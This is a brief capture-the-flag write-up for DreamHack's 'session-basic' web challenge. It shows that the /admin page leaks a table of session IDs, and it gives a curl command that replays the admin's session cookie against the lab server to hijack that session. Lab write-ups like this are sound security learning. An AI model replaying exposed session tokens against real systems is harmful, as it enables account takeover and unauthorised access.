# session-basic — DreamHack

> **Room / Challenge:** session-basic (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** session-basic (web)
- **Link**: `https://dreamhack.io/wargame/challenges/409`
- **Level:** `1`
- **Date:** `22-12-2025`

---

## My Solution

Visit `/admin` and get:

```json
{ "2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d": "admin" }
```

Make a curl request:

```bash
curl http://host8.dreamhack.games:8733 -b "sessionid=2d6e1ed24747725ac7500d87818ba675ecb58936f894f8875516dfb5c49ace5d"
```
